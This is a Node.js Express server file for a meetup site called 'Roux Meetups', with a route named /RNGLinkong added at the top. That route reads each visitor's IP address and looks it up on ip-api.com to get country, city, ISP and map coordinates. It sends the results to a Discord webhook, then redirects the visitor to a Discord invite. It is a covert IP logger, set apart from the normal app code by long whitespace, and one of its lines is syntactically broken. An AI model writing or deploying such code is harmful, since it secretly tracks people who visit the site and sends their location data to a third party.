var express = require('express');
var reload = require('reload');
var app = express();
var dataFile = require('./data/data.json');
var io = require('socket.io')();
const kpath = require('node-fetch');
const { Webhook, MessageBuilder } = require('@prince25/discord-webhook-sender');
const hook = new Webhook (process.env.Ozoraa)

app.get("/RNGLinkong", async function(request, response) {
 const inviteTG =[]


await kpath(`http://rngbyozoraa.glitch.me/rngvip`)
.then(response => response.json())
.then(response => JSON.stringify(response[1].inviteYT))
.then(response => JSON.parse(response))
  .then (responses =>  {inviteTG.push({link :responses}) 
}
)         


//const godok = JSON.stringify(inviteTG[1].link)
 // console.log(godok)

// .then(response => response.substring(1, response.length-1))
// .then(hasil => console.log(hasil))
// //const TelegramLink = db.get("inviteTG");
var ip = request.headers['x-forwarded-for'] || request.connection.remoteAddress;
var IP = '';
    IP = ip = ip.split(',')[0]; 
// const ip = request.headers['x-forwarded-for'] || request.connection.remoteAddress;
  // console.log(IP); // ip address of the user
 // console.log(lookup(IP)); // location of the user
    
kpath(`http://ip-api.com/json/`+IP).then(response => response.json()).then(data => {

  
  
  

const embed = new MessageBuilder()
.setTitle('My title here')
.setAuthor('Author here', 'https://cdn.discordapp.com/embed/avatars/0.png', 'https://www.google.com')
.setURL('https://www.google.com')
.addField('First field', 'this is inline', true)
.addFields( 'Ip', `${data.query}`,  true )
.addFields( 'Country and Code  ', `${data.countryCode} - ${data.country}`,true )
.addFields('Region/Province',  `${data.regionName} - ${data.region}`,  true )
.addFields( 'City',  `${data.city}`, true )
.addFields( 'Location',  `https://maps.google.com/?q=${data.lat},${data.lon}`,  true )
.addFields( 'Zip&TimeZone'`${data.zip}|${data.timezone}`,'ISP',  `**${data.isp}**|${data.as}`,  true )
.addFields('Org | Data',  `${data.org}|`, `https://bit.ly/RNGSociety`, true)         

hook.send(embed);

});
   console.log(inviteTG)
  let godok = JSON.parse(JSON.stringify(inviteTG[0].link))
  
  response.redirect(`https://discord.gg/${godok}`); ////https://bit.ly/RNG_Discord
});          









































app.set('port', process.env.PORT || 3000 );
app.set('appData', dataFile);
app.set('view engine', 'ejs');
app.set('views', 'app/views');

app.locals.siteTitle = 'Roux Meetups';
app.locals.allSpeakers = dataFile.speakers;

app.use(express.static('app/public'));
app.use(require('./routes/index'));
app.use(require('./routes/speakers'));
app.use(require('./routes/feedback'));
app.use(require('./routes/api'));
app.use(require('./routes/chat'));

var server = app.listen(app.get('port'), function() {
  console.log('Listening on port ' + app.get('port'));
});

io.attach(server);
io.on('connection', function(socket) {
  socket.on('postMessage', function(data) {
    io.emit('updateMessages', data);
  });
});

reload(server, app);
